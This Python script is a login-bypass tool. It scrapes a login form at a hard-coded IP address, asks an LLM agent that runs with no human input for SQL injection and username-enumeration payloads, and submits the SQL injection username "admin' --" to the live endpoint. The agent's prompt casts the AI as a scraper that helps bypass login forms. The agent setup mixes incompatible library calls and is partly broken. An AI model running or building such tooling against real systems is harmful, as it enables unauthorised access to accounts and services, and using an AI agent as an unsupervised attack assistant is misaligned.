import os
import requests
from bs4 import BeautifulSoup
from langchain.agents import ConversationalAgent  # Correct import for the agent
from langchain_community.chat_models import ChatOpenAI  # Corrected import for ChatOpenAI
# Remove JsonOutputParser import if not necessary
from autogen import ConversableAgent

# Langchain Configuration for GPT
llm_config_gpt35_turbo = {
    'cache_seed': None,
    "config_list": [{"model": "gpt-3.5-turbo", "api_key": os.environ["OPENAI_API_KEY"]}],
    'temperature': 0.1,
    'timeout': 6000
}

# Initialize the agent
agent = ConversationalAgent(
    "AI_LOGINSCRAPER",
    max_consecutive_auto_reply=5,
    human_input_mode='NEVER',
    llm_config=llm_config_gpt35_turbo,
)

# Scraper Class
class LoginScraper:
    def __init__(self, base_url, login_url):
        self.base_url = base_url
        self.login_url = login_url
        self.session = requests.Session()
    
    def get_login_page(self):
        """Scrape the login page and find form details."""
        response = self.session.get(self.login_url)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Extract form fields (hidden fields, username, password, etc.)
        form = soup.find('form')
        inputs = form.find_all('input')
        
        form_details = {}
        for input_tag in inputs:
            input_name = input_tag.get('name')
            input_value = input_tag.get('value', '')
            form_details[input_name] = input_value
        return form_details
    
    def submit_login(self, username, password, form_data):
        """Submit login form with AI-generated credentials or bypass strategy."""
        form_data['username'] = username
        form_data['password'] = password
        response = self.session.post(self.login_url, data=form_data)
        return response

# Function to create AI prompt for bypassing the login
def generate_bypass_prompt():
    prompt = """
    You are an advanced AI scraper that helps bypass login forms. 
    The goal is to analyze the HTML form and suggest ways to bypass login (such as SQL injection, username enumeration, etc.).
    Consider the form structure and provide any necessary strategies, payloads, or techniques that could be used to bypass it. 
    The login page HTML structure is as follows:
    <html><body><form><input type="text" name="username"><input type="password" name="password"><input type="submit"></form></body></html>
    Please return only the necessary strategy and payloads for bypassing this form.
    """
    return prompt

# Example of a Langchain agent using the above prompt
def handle_bypass_prompt():
    prompt = generate_bypass_prompt()

    agent_response = agent.ask(prompt)
    return agent_response['content']

# Using the Scraper and Langchain for Bypass
def main():
    base_url = "http://13.36.65.25:8080/"
    login_url = f"{base_url}/login"
    scraper = LoginScraper(base_url, login_url)
    
    # Get form details
    form_details = scraper.get_login_page()
    print("Form details extracted:", form_details)
    
    # Get AI suggestions for bypassing the login form
    bypass_strategies = handle_bypass_prompt()
    print("AI Bypass Strategies:", bypass_strategies)
    
    # Try submitting the form (assuming AI suggested payloads for bypass)
    username = "admin' --"
    password = "password"
    
    response = scraper.submit_login(username, password, form_details)
    print("Login Response:", response.status_code)

if __name__ == "__main__":
    main()